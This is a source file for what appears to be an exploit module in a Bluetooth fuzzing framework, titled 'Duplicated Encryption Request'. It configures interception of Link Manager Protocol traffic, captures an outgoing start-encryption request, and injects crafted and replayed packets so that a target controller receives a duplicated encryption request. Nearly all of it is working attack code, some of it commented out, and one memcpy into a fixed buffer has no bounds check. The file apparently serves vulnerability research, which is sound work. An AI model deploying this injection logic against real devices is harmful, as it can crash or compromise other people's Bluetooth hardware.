#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>

// Filters
static const char *filter_malformed;

// Vars
static int tx_count = -1;
static uint malformed_count = 0;
static uint f_count = 0;

// Setup
static const char *module_name()
{
    return "Duplicated Encryption Request";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 10000;
    config->options.auto_start = true;
    config->bluetooth.disable_role_switch = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;


    filter_malformed = packet_register_filter("_ws.malformed");

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

// LMP_setup_complete
static uint8_t lmp_start_encryption_request[] = {0x99, 0x3,
                                                 0x8f, 0x0,
                                                 0x22, 0x84, 0xb3, 0x95, 0x99, 0x88,
                                                 0x5d, 0xa8, 0x25, 0x98, 0x9f, 0xf, 0xd1, 0x40,
                                                 0x8c, 0x4d, 0xea, 0xbc};

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Send LMP_start_encryption_request
    if (p && pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 17))
    {
       

        f_count++;

        if(f_count > 1)
        {
            memcpy(lmp_start_encryption_request, pkt_buf, pkt_length);
            tx_count = 4;
            f_count = 0;
            wd_log_y("Sending LMP_start_encryption_request after 3 TX packets");
        }
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    packet_set_filter(filter_malformed);
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (packet_read_filter(filter_malformed))
    {
        if (++malformed_count >= 4)
        {
            module_request_t *m = (module_request_t *)p;
            // m->stop = true;
            // wd_log_r("Target accepts duplicated encryption request");
        }
    }

    if (tx_count >= 0)
    {

        switch (tx_count--)
        {

        case 3:
        {
            static uint8_t packet[] = {0x99, 0x3,
                                       0x17, 0x0, 0x20, 0x10, 0x25};

            module_request_t *m = (module_request_t *)p;
            m->tx_count = 1;
            m->pkt_buf = packet;
            m->pkt_len = sizeof(packet);
            break;
        }
        case 2:
        {
            // static uint8_t packet[] = {0x99, 0x3,
            //                            0x8f, 0x0, 0x16, 0xfb, 0x8f, 0x5b, 0x39, 0x31,
            //                            0x83, 0x64, 0xc5, 0x4c, 0xdf, 0xca, 0xae, 0x9d,
            //                            0x1, 0x8e, 0xbb, 0xa6};
            // module_request_t *m = (module_request_t *)p;
            // m->tx_count = 1;
            // m->pkt_buf = packet;
            // m->pkt_len = sizeof(packet);

            break;
        }
        case 1:
        {
            // static uint8_t packet[] = {0x99, 0x3,
            //                            0xf, 0x0, 0x62, 0x24};
            // module_request_t *m = (module_request_t *)p;
            // m->tx_count = 1;
            // m->pkt_buf = packet;
            // m->pkt_len = sizeof(packet);
            break;
        }

        case 0:
        {
            module_request_t *m = (module_request_t *)p;
            m->tx_count = 1;
            m->pkt_buf = lmp_start_encryption_request;
            m->pkt_len = sizeof(lmp_start_encryption_request);
            lmp_start_encryption_request[15] = 0;
            break;
        }

        default:
            break;
        }
    }
    // Send LMP_start_encryption_request
    else if (p && pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 17))
    {
        // memcpy(lmp_start_encryption_request, pkt_buf, pkt_length);
        // wd_log_y("Sending LMP_start_encryption_request after 3 TX packets");

        // tx_count = 4;
    }


    return 0;
}